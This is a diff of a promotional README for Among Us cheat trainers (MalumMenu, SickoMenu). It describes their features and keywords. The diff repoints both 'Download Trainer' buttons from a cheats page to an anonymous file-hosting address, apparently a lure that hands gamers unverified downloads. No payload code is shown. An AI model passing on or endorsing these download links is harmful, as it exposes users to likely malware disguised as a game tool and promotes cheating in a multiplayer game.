@@ -4,14 +4,14 @@
 
 Among Us has captivated players worldwide with its blend of strategy and deception. For those looking to add a twist to their gameplay, trainers offer a range of enhancements. This guide explores popular Among Us trainers, their features, comparisons, system requirements, installation instructions, and more.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/among-us)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload5.bitbucket.io)
 ---
 
 ## Product Description
 
 Among Us trainers are third-party tools that modify the game's behavior, providing players with additional capabilities. These tools can alter gameplay elements, offering features not available in the standard game.
 
-[![Download Trainer](https://wotpack.ru/wp-content/uploads/2020/11/Trainer.jpg)](https://wecheaters.github.io/cheats/among-us)
+[![Download Trainer](https://wotpack.ru/wp-content/uploads/2020/11/Trainer.jpg)](https://fileoffload5.bitbucket.io)
 ---
 
 ## Features
@@ -78,3 +78,4 @@ Among Us trainers like MalumMenu and SickoMenu offer players new ways to experie
 ## Keywords
 
 Among Us trainer, MalumMenu, SickoMenu, game enhancements, role manipulation, NoClip, impostor reveal, cosmetic unlocks, Among Us mods, gameplay tools.
+
